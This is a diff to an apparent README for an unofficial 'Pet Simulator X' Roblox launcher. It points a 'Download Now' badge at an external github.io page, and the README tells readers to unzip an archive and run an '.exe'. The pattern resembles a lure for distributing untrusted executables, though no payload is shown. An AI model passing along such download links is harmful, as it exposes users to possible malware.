@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the launcher.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://pet-simulator-x-for-roblox.github.io/.github/)
 
 ## 📸 Overview
 ![pet-simulator-x-hd-graphics](https://github.com/user-attachments/assets/6ab59788-f0bf-472b-9501-f27c186a3d3b)
